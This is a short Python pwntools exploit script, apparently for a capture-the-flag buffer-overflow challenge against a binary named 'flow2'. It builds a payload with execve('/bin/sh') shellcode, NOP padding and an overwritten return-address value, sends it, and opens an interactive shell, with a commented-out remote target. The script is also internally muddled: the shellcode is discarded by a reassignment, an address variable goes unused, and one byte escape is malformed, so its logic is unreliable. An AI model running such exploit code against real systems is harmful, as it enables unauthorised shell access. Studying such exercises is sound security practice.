from pwn import *
from pwn import p64



offset = 88
nop = b'\x90'
shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# add a null byte
shellcode += b"\x00"
buff_addr = p64(0x7fffffffdda0)
shellcode = b"\x5a\x12\40\x00"
elf = ELF('flow2')
p = elf.process()
# p = remote("0.0.0.0", 2001)
payload = shellcode + (88 - len(shellcode)) * nop + shellcode 
p.sendline(payload)
p.interactive()

